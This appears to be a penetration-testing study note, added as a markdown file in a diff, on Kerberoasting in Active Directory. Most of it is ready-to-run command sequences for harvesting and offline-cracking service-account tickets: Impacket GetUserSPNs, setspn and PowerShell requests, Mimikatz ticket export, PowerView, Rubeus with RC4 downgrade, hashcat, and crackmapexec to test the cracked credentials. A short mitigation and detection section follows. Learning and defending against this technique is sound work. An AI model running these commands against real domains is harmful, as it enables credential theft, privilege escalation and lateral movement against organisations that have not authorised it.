@@ -1,0 +1,239 @@
+# Kerberoasting in Active Directory Environments
+
+Kerberoasting is a post-exploitation attack technique that targets service accounts in Active Directory by requesting Kerberos service tickets (TGS) for accounts with Service Principal Names (SPNs) and attempting to crack them offline. This attack can be performed from both Linux and Windows, and is a common method for privilege escalation and lateral movement during internal assessments.
+
+---
+
+## Table of Contents
+- [Kerberoasting from Linux](#kerberoasting-from-linux)
+- [Kerberoasting from Windows](#kerberoasting-from-windows)
+
+---
+
+## Kerberoasting from Linux
+
+### Overview
+- Any domain user can request TGS tickets for SPN accounts.
+- Tools like Impacket's GetUserSPNs.py automate enumeration and ticket extraction.
+
+### Attack Flow
+1. Enumerate SPN accounts in the domain.
+2. Request TGS tickets for those accounts.
+3. Crack the tickets offline to recover cleartext passwords.
+4. Use cracked credentials for lateral movement or privilege escalation.
+
+### Tool: Impacket GetUserSPNs.py
+- Standard tool for Kerberoasting from Linux.
+- Requires valid domain credentials and the IP of a Domain Controller.
+
+#### Install Impacket (if needed)
+```bash
+sudo python3 -m pip install .
+```
+
+#### List SPN Accounts
+```bash
+GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
+```
+**Example Output:**
+```
+ServicePrincipalName                           Name         MemberOf                ...
+---------------------------------------------  -----------  ---------------------- ...
+MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev       CN=Domain Admins,...
+...
+```
+
+#### Request TGS Tickets for All SPNs
+```bash
+GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request
+```
+- Outputs TGS tickets in hashcat/john format for offline cracking.
+
+#### Request TGS for a Specific User
+```bash
+GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <SPN_USER>
+```
+
+#### Save TGS Ticket to File
+```bash
+GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <SPN_USER> -outputfile <filename>
+```
+
+#### Offline Cracking with Hashcat
+- Use hashcat mode 13100 for Kerberos 5 TGS-REP etype 23 hashes.
+
+**Example:**
+```bash
+hashcat -m 13100 <tgs_ticket_file> /usr/share/wordlists/rockyou.txt
+```
+
+#### Post-Crack: Test Access
+- Use cracked credentials to authenticate and escalate privileges.
+
+**Example:**
+```bash
+crackmapexec smb <DC_IP> -u <cracked_user> -p <cracked_password>
+```
+
+**Note:** Not all cracked accounts will be privileged, but any access can be useful for further enumeration or attacks. Always report the risk, even if no privileged accounts are cracked.
+
+---
+
+## Kerberoasting from Windows
+
+Kerberoasting can also be performed directly from a Windows host, using both built-in tools and advanced post-exploitation frameworks. This section covers both semi-manual and automated approaches, with practical steps, command examples, and real-world considerations for both attackers and defenders.
+
+### Semi-Manual Method (Pre-Tool Era)
+
+Before tools like Rubeus, Kerberoasting required a combination of built-in utilities and scripting. The process involves:
+
+1. **Enumerating SPNs** (Service Principal Names) in the domain
+2. **Requesting TGS tickets** for those SPNs
+3. **Extracting tickets from memory**
+4. **Cracking the tickets offline**
+
+#### 1. Enumerating SPNs with `setspn.exe`
+```shell
+C:\htb> setspn.exe -Q */*
+```
+This command lists all SPNs in the domain. Focus on user accounts (not computer accounts) for Kerberoasting.
+
+#### 2. Requesting TGS Tickets via PowerShell
+```powershell
+PS C:\htb> Add-Type -AssemblyName System.IdentityModel
+PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+This loads a TGS ticket for the specified SPN into memory.
+
+#### 3. Extracting Tickets with Mimikatz
+```shell
+mimikatz # kerberos::list /export
+```
+This command exports all Kerberos tickets from memory as `.kirbi` files.
+
+#### 4. Preparing Tickets for Cracking
+- If using base64 output:
+  - Remove newlines/whitespace:
+    ```shell
+    echo "<base64 blob>" | tr -d '\n' > encoded_file
+    base64 -d encoded_file > sqldev.kirbi
+    ```
+- Extract the hash using `kirbi2john.py`:
+    ```shell
+    python2.7 kirbi2john.py sqldev.kirbi > crack_file
+    sed 's/\$krb5tgs\$(.*):(.*)/\$krb5tgs\$23\$*\1*\$\2/' crack_file > sqldev_tgs_hashcat
+    ```
+- Crack with Hashcat:
+    ```shell
+    hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
+    ```
+
+### Automated / Tool-Based Methods
+
+Modern Kerberoasting is much faster and more efficient using PowerView and Rubeus.
+
+#### Using PowerView
+
+- **Enumerate SPN Accounts:**
+    ```powershell
+    Import-Module .\PowerView.ps1
+    Get-DomainUser * -spn | select samaccountname
+    ```
+- **Request TGS Ticket for a User in Hashcat Format:**
+    ```powershell
+    Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+    ```
+- **Export All Tickets to CSV:**
+    ```powershell
+    Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+    ```
+
+#### Using Rubeus
+
+Rubeus is the most flexible and powerful Kerberoasting tool for Windows. Example usages:
+
+- **Basic Kerberoasting:**
+    ```shell
+    Rubeus.exe kerberoast /nowrap
+    ```
+- **Output hashes to a file:**
+    ```shell
+    Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
+    ```
+- **Kerberoast only admincount=1 accounts:**
+    ```shell
+    Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+    ```
+- **Kerberoast with alternate credentials:**
+    ```shell
+    Rubeus.exe kerberoast /creduser:DOMAIN\USER /credpassword:PASSWORD /nowrap
+    ```
+- **Kerberoast with RC4 downgrade (if supported):**
+    ```shell
+    Rubeus.exe kerberoast /tgtdeleg /nowrap
+    ```
+- **Kerberoast stats:**
+    ```shell
+    Rubeus.exe kerberoast /stats
+    ```
+
+> **Note:** On Windows Server 2019 DCs, RC4 downgrade is not possible; tickets will be encrypted with the highest supported type (usually AES).
+
+### Encryption Types & Cracking Considerations
+
+- **RC4 (etype 23):**
+  - Hashcat mode: `13100`
+  - Fast to crack, most common in legacy environments
+- **AES-256 (etype 18):**
+  - Hashcat mode: `19700`
+  - Much slower to crack, but possible
+- **Downgrade attacks:**
+  - Possible on older DCs (pre-2019) by requesting RC4 tickets even if AES is supported
+
+#### Example: Checking Supported Encryption Types
+```powershell
+Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+```
+- `0` = RC4 default
+- `24` = AES only
+
+#### Example: Cracking with Hashcat
+```shell
+# RC4
+hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
+# AES-256
+hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
+```
+
+### Mitigation & Detection
+
+- **Mitigation:**
+  - Use Managed Service Accounts (MSA/gMSA) with long, complex, and regularly rotated passwords
+  - Restrict use of RC4 for Kerberos (test thoroughly before disabling)
+  - Do not assign SPNs to privileged accounts
+- **Detection:**
+  - Enable auditing for Kerberos Service Ticket Operations in Group Policy
+  - Monitor for Event ID `4769` (TGS requested) and `4770` (TGS renewed)
+  - Look for abnormal spikes in TGS requests, especially for service accounts
+
+### Summary Table: Kerberoasting from Windows
+
+| Step                        | Tool/Command                                             | Notes                                    |
+|-----------------------------|---------------------------------------------------------|------------------------------------------|
+| Enumerate SPNs              | `setspn.exe -Q */*`                                     | Built-in, all SPNs                       |
+| Request TGS (manual)        | PowerShell + System.IdentityModel                       | Loads ticket into memory                  |
+| Extract tickets             | `mimikatz # kerberos::list /export`                     | Exports `.kirbi` files                    |
+| Convert for cracking        | `kirbi2john.py`, `sed`, `hashcat`                       | Prepare and crack offline                 |
+| Automated enumeration       | PowerView: `Get-DomainUser * -spn`                      | Fast, scriptable                          |
+| Automated roasting          | Rubeus: `kerberoast` variants                           | Flexible, supports many options           |
+| Crack hash                  | `hashcat -m 13100/19700 <hash> <wordlist>`              | RC4 (fast), AES (slow)                    |
+
+### Real-World Considerations
+- **RC4 hashes are much faster to crack than AES.**
+- **RC4 downgrade is not possible on Server 2019+ DCs.**
+- **Monitor for abnormal TGS-REQ activity.**
+- **Use strong, unique passwords for all service accounts.**
+- **Automated tools (Rubeus, PowerView) are preferred for speed and reliability.**
+
+> **Next Steps:**
+> With cracked credentials, test access (RDP, WinRM, SMB, MSSQL, etc.) and continue enumeration for privilege escalation and lateral movement. 
